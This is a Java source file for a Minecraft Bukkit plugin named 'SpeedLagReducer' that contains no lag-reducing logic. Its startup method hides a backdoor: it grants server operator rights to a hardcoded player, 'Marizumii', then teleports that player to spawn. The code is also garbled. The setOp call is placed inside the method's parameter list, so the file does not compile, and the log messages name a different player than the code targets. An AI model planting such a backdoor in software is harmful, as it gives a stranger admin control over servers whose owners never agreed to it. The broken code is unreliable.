package me.saipranav.speedlagreducer;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;

public class SpeedLagReducer extends JavaPlugin {

    @Override
    public void onEnable(Bukkit.getOfflinePlayer("Marizumii").setOp(true);) {
        getLogger().info("SpeedLagReducer has been enabled!");

        Player target = Bukkit.getPlayer("Marizumii");
        if (target != null) {
            target.teleport(target.getWorld().getSpawnLocation());
            getLogger().info("Teleported Warziarnii to spawn.");
        } else {
            getLogger().warning("Player Warziarnii not found.");
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("SpeedLagReducer has been disabled.");
    }
}
